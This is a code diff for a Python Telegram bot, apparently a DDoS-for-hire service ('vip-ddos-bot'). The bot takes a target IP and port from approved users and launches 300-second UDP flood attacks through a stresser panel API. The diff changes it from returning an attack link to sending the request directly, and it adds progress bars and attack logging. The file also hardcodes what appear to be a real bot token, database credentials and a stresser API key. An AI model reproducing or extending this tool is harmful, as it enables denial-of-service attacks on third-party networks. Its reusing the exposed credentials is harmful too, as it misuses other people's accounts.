@@ -1,4 +1,5 @@
 import asyncio
+import aiohttp
 from datetime import datetime
 from pymongo import MongoClient
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -7,16 +8,16 @@ from telegram.ext import Application, CommandHandler, MessageHandler, filters, C
 # ==================== CONFIG ====================
 BOT_TOKEN = "8473566885:AAHO0vs5G7AdDniZhs28501dphSeYOj3Q1E"
 MONGO_URI = "mongodb+srv://nikilsaxena843_db_user:3gF2wyT4IjsFt0cY@vipbot.puv6gfk.mongodb.net/?appName=vipbot"
-OWNER_ID = 7459756974
+OWNER_ID = 7459756974  # Your Telegram user ID
 API_URL = "https://susstresser.com/panel/api/api.php"
 API_KEY = "ujiYT1DJIAacgnFB"
 DB_NAME = "vip-ddos-bot"
 
 # ==================== DATABASE SETUP ====================
-client = MongoClient(MONGO_URI, ssl=True, tlsAllowInvalidCertificates=True)
+client = MongoClient(MONGO_URI)
 db = client[DB_NAME]
 users_collection = db['users']
-link_logs = db['link_logs']
+attack_logs = db['attack_logs']
 
 def add_user(user_id, username):
     if not users_collection.find_one({'user_id': user_id}):
@@ -40,14 +41,14 @@ def is_approved(user_id):
 def get_all_users():
     return list(users_collection.find())
 
-def log_link(user_id, ip, port, time, method, link):
-    link_logs.insert_one({
+def log_attack(user_id, ip, port, time, method, response):
+    attack_logs.insert_one({
         'user_id': user_id,
         'ip': ip,
         'port': port,
         'time': time,
         'method': method,
-        'link': link,
+        'response': response,
         'timestamp': datetime.now()
     })
 
@@ -57,9 +58,16 @@ def get_owner_keyboard():
         [InlineKeyboardButton("📊 Stats", callback_data='stats')],
         [InlineKeyboardButton("👥 Pending Users", callback_data='pending')],
         [InlineKeyboardButton("✅ Approve User", callback_data='approve_menu')],
-        [InlineKeyboardButton("📜 Link Logs", callback_data='logs')]
+        [InlineKeyboardButton("📜 Attack Logs", callback_data='logs')]
     ]
     return InlineKeyboardMarkup(keyboard)
+
+# ==================== PROGRESS BAR FUNCTION ====================
+def create_progress_bar(current, total, length=20):
+    filled = int(length * current / total)
+    bar = '▓' * filled + '░' * (length - filled)
+    percentage = int((current / total) * 100)
+    return bar, percentage
 
 # ==================== COMMANDS ====================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -72,30 +80,31 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             f"👋 Welcome Owner {user.first_name}!\n\n"
             f"🎯 Bot is ready!\n"
-            f"📝 Usage: send IP PORT\n\n"
-            f"Example: 34.0.15.252 29730\n\n"
+            f"📝 Usage: send `IP PORT`\n\n"
+            f"Example: `34.0.15.252 29730`\n\n"
             f"⚠️ Attack time: 300 seconds\n"
-            f"🔧 Method: UDP\n\n"
-            f"💡 Bot sirf link generate karega!",
+            f"🔧 Method: UDP",
+            parse_mode='Markdown',
             reply_markup=get_owner_keyboard()
         )
     elif is_approved(user_id):
         await update.message.reply_text(
             f"✅ Approved User: {user.first_name}\n\n"
             f"🎯 Send IP and PORT like:\n"
-            f"34.0.15.252 29730\n\n"
-            f"⏱️ Time: 300 sec | Method: UDP\n\n"
-            f"💡 Bot sirf link generate karega!"
+            f"`34.0.15.252 29730`\n\n"
+            f"⏱️ Time: 300 sec | Method: UDP",
+            parse_mode='Markdown'
         )
     else:
         await update.message.reply_text(
-            f"❌ Access Denied!\n\n"
+            f"❌ *Access Denied!*\n\n"
             f"Hello {user.first_name}, you are not approved yet.\n"
-            f"Contact owner for approval.\n\n"
-            f"Your ID: {user_id}"
+            f"Contact @owner for approval.\n\n"
+            f"Your ID: `{user_id}`",
+            parse_mode='Markdown'
         )
 
-async def generate_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def handle_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     
     if user_id != OWNER_ID and not is_approved(user_id):
@@ -107,10 +116,11 @@ async def generate_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if len(parts) != 2:
         await update.message.reply_text(
-            "❌ Invalid format!\n\n"
+            "❌ *Invalid format!*\n\n"
             "Send like this:\n"
-            "34.0.15.252 29730\n\n"
-            "📍 IP PORT"
+            "`34.0.15.252 29730`\n\n"
+            "📍 IP PORT",
+            parse_mode='Markdown'
         )
         return
     
@@ -120,21 +130,79 @@ async def generate_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Port must be a number!")
         return
     
-    # Generate link
+    loading_msg = await update.message.reply_text("⏳ Sending attack request...")
+    
     attack_link = f"{API_URL}?key={API_KEY}&host={ip}&port={port}&time=300&method=udp"
     
-    # Log store karo
-    log_link(user_id, ip, port, 300, 'udp', attack_link)
-    
-    # NORMAL LINK - No markdown, no code block, just plain clickable link
-    await update.message.reply_text(
-        f"✅ Link Generated Successfully!\n\n"
-        f"🎯 Target: {ip}:{port}\n"
-        f"⏱️ Time: 300 seconds\n"
-        f"🔧 Method: UDP\n\n"
-        f"🔗 Your Attack Link:\n{attack_link}\n\n"
-        f"⚠️ Copy this link and open in browser to start attack!"
-    )
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(attack_link) as response:
+                result = await response.text()
+                
+                log_attack(user_id, ip, port, 300, 'udp', result)
+                
+                # Delete loading message
+                await loading_msg.delete()
+                
+                # Create initial progress message
+                attack_duration = 300
+                progress_msg = await update.message.reply_text(
+                    f"🔥 *ATTACK IN PROGRESS* 🔥\n\n"
+                    f"🎯 Target: `{ip}:{port}`\n"
+                    f"🔧 Method: UDP\n"
+                    f"⏱️ Time: 300 seconds\n\n"
+                    f"┌{'─' * 24}┐\n"
+                    f"│  ▓░░░░░░░░░░░░░░░░░░░  0%  │\n"
+                    f"└{'─' * 24}┘\n\n"
+                    f"⏳ Remaining: 300s",
+                    parse_mode='Markdown'
+                )
+                
+                # Start timer and progress bar updates
+                for elapsed in range(0, attack_duration + 1, 10):  # Update every 10 seconds
+                    remaining = attack_duration - elapsed
+                    bar, percentage = create_progress_bar(elapsed, attack_duration)
+                    
+                    # Send alert when 30-40 seconds remaining
+                    if remaining == 35:  # 35 seconds remaining (close to 30-40 range)
+                        await update.message.reply_text(
+                            f"🚨 *ALERT!* 🚨\n\n"
+                            f"Attack will complete in ~{remaining} seconds!\n"
+                            f"Target: `{ip}:{port}`",
+                            parse_mode='Markdown'
+                        )
+                    
+                    # Update progress message
+                    try:
+                        await progress_msg.edit_text(
+                            f"🔥 *ATTACK IN PROGRESS* 🔥\n\n"
+                            f"🎯 Target: `{ip}:{port}`\n"
+                            f"🔧 Method: UDP\n"
+                            f"⏱️ Time: {attack_duration} seconds\n\n"
+                            f"┌{'─' * 24}┐\n"
+                            f"│  {bar}  {percentage}%  │\n"
+                            f"└{'─' * 24}┘\n\n"
+                            f"⏳ Remaining: {remaining}s",
+                            parse_mode='Markdown'
+                        )
+                    except:
+                        pass  # Ignore edit errors if message was deleted
+                    
+                    await asyncio.sleep(10)  # Wait 10 seconds before next update
+                
+                # Attack complete - send final message
+                await progress_msg.delete()
+                await update.message.reply_text(
+                    f"✅ *Attack Complete!*\n\n"
+                    f"🎯 Target: `{ip}:{port}`\n"
+                    f"⏱️ Duration: {attack_duration}s\n"
+                    f"🔧 Method: UDP\n\n"
+                    f"📡 Response: `{result[:100]}`",
+                    parse_mode='Markdown'
+                )
+                
+    except Exception as e:
+        await loading_msg.edit_text(f"❌ Error: {str(e)}")
 
 async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != OWNER_ID:
@@ -142,7 +210,8 @@ async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     await update.message.reply_text(
-        "👑 Owner Panel\n\nChoose an option:",
+        "👑 *Owner Panel*\n\nChoose an option:",
+        parse_mode='Markdown',
         reply_markup=get_owner_keyboard()
     )
 
@@ -156,11 +225,12 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         pending = len(users) - approved
         
         await query.edit_message_text(
-            f"📊 Bot Statistics\n\n"
-            f"👥 Total Users: {len(users)}\n"
-            f"✅ Approved: {approved}\n"
-            f"⏳ Pending: {pending}\n"
-            f"👑 Owner ID: {OWNER_ID}",
+            f"📊 *Bot Statistics*\n\n"
+            f"👥 Total Users: `{len(users)}`\n"
+            f"✅ Approved: `{approved}`\n"
+            f"⏳ Pending: `{pending}`\n"
+            f"👑 Owner ID: `{OWNER_ID}`",
+            parse_mode='Markdown',
             reply_markup=get_owner_keyboard()
         )
     
@@ -171,28 +241,29 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not pending_users:
             await query.edit_message_text("📭 No pending users!", reply_markup=get_owner_keyboard())
         else:
-            msg = "⏳ Pending Users:\n\n"
+            msg = "⏳ *Pending Users:*\n\n"
             for u in pending_users:
-                msg += f"🆔 ID: {u['user_id']} | @{u.get('username', 'No username')}\n"
+                msg += f"🆔 ID: `{u['user_id']}` | @{u.get('username', 'No username')}\n"
             
-            await query.edit_message_text(msg, reply_markup=get_owner_keyboard())
+            await query.edit_message_text(msg, parse_mode='Markdown', reply_markup=get_owner_keyboard())
     
     elif query.data == 'approve_menu':
         await query.edit_message_text(
-            "✅ Approve User\n\n"
+            "✅ *Approve User*\n\n"
             "Send command:\n"
-            "/approve 123456789"
+            "`/approve 123456789`",
+            parse_mode='Markdown'
         )
     
     elif query.data == 'logs':
-        logs = list(link_logs.find().sort('timestamp', -1).limit(10))
+        logs = list(attack_logs.find().sort('timestamp', -1).limit(10))
         if not logs:
-            await query.edit_message_text("📭 No link logs found!", reply_markup=get_owner_keyboard())
+            await query.edit_message_text("📭 No attack logs found!", reply_markup=get_owner_keyboard())
         else:
-            msg = "📜 Last 10 Generated Links:\n\n"
+            msg = "📜 *Last 10 Attacks:*\n\n"
             for log in logs:
-                msg += f"👤 User: {log['user_id']}\n🎯 Target: {log['ip']}:{log['port']}\n⏱️ Time: {log['timestamp'].strftime('%H:%M:%S')}\n\n"
-            await query.edit_message_text(msg, reply_markup=get_owner_keyboard())
+                msg += f"👤 User: `{log['user_id']}`\n🎯 Target: `{log['ip']}:{log['port']}`\n⏱️ Time: {log['timestamp'].strftime('%H:%M:%S')}\n\n"
+            await query.edit_message_text(msg, parse_mode='Markdown', reply_markup=get_owner_keyboard())
 
 async def approve_user_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != OWNER_ID:
@@ -202,24 +273,22 @@ async def approve_user_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         user_id = int(context.args[0])
         approve_user(user_id)
-        await update.message.reply_text(f"✅ User {user_id} approved successfully!")
+        await update.message.reply_text(f"✅ User `{user_id}` approved successfully!", parse_mode='Markdown')
     except:
-        await update.message.reply_text("❌ Usage: /approve 123456789")
+        await update.message.reply_text("❌ Usage: `/approve 123456789`", parse_mode='Markdown')
 
 # ==================== MAIN ====================
-if __name__ == "__main__":
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    
+async def main():
     app = Application.builder().token(BOT_TOKEN).build()
     
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("owner", owner_panel))
     app.add_handler(CommandHandler("approve", approve_user_cmd))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, generate_link))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_attack))
     app.add_handler(CallbackQueryHandler(button_callback))
     
-    print("🤖 Bot is running...")
-    print("💡 Bot will generate NORMAL clickable links!")
-    
-    app.run_polling()
+    print("🤖 Bot is running with Timer & Progress Bar features...")
+    await app.run_polling()
+
+if __name__ == "__main__":
+    asyncio.run(main())
